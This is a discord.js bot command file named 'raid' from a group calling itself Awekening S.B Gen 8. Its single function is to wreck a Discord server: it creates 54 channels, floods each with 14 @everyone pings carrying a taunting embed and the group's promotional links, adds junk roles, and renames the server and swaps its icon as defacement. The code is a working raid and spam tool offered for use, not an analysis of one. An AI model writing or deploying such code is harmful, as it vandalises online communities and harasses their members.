const { ChatInputCommandInteraction, SlashCommandBuilder, ChannelFlags, ChannelType, EmbedBuilder, ButtonBuilder, ButtonStyle, ActionRowBuilder} = require("discord.js");
const {User} = require("../../schema/User")

module.exports = {
    data: new SlashCommandBuilder()
    .setName("raid")
    .setDescription("r4idea todo un servidor"),
    /**
     * 
     * @param {ChatInputCommandInteraction} interaction 
     */
   async execute(interaction){

     try {


        const user = await User.findOne({ id: interaction.user.id})
        if(!user){
            await new User({
                id: interaction.user.id,
                username: interaction.user.username
            }).save()
        }




         //Componente embed
         const embed = new EmbedBuilder()
         .setAuthor({
             name: "Awekening S.B Gen 8",
             iconURL: null
         })
         .setDescription("Este servidor ha muerto a manos de Awekening S.B Gen 8\n"+user?.setup?.messageContent)
         .setColor("Red")
         .setImage("https://media.discordapp.net/attachments/1060263396416696463/1266929667500413008/banner.gif")
         .setFooter({
             text: "Made in Awekening S.B Gen 8", 
             iconURL: null
         })
 
 
 
 
 
         const bt1 = new ButtonBuilder()
         .setLabel("✅ Discord")
         .setURL("https://discord.gg/x9r58C3mne")
         .setStyle(ButtonStyle.Link)
 
         const bt2 = new ButtonBuilder()
         .setLabel("📺 Youtube")
         .setURL("https://www.youtube.com/@awekening992")
         .setStyle(ButtonStyle.Link)
 
         const bt3 = new ButtonBuilder()
         .setLabel("🌐 Website")
         .setURL("https://awekeningsb.com")
         .setStyle(ButtonStyle.Link)
 
         const actionRow = new ActionRowBuilder().addComponents(bt1, bt2, bt3)
 
        
        for(let i = 0; i < 54; i++){
            const ch = await interaction.guild.channels.create({
                type: ChannelType.GuildText,
                name: user?.setup?.channelName
            }).then((ch) => {
                      
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
                ch.send({content: "@everyone",embeds: [embed],components: [actionRow]})
              
            })

          
          interaction.guild.roles.create({
            name: "Possessed By Awekening",
            permissions: []
          })
            
    
        }
       

       



        await interaction.guild.setName("Possessed By Awekening")
        await interaction.guild.setIcon("https://images-ext-1.discordapp.net/external/CSO_QO-Rqka-pvoOY9MDRPKgtiPGCv8cpEr04uV4bDk/%3Fsize%3D2048/https/cdn.discordapp.com/icons/1057720116214763581/657311c86d5c4a62b4ee8f57a6ae294a.png")


        


     } catch (error) {
        console.log(error)
     }




    },
};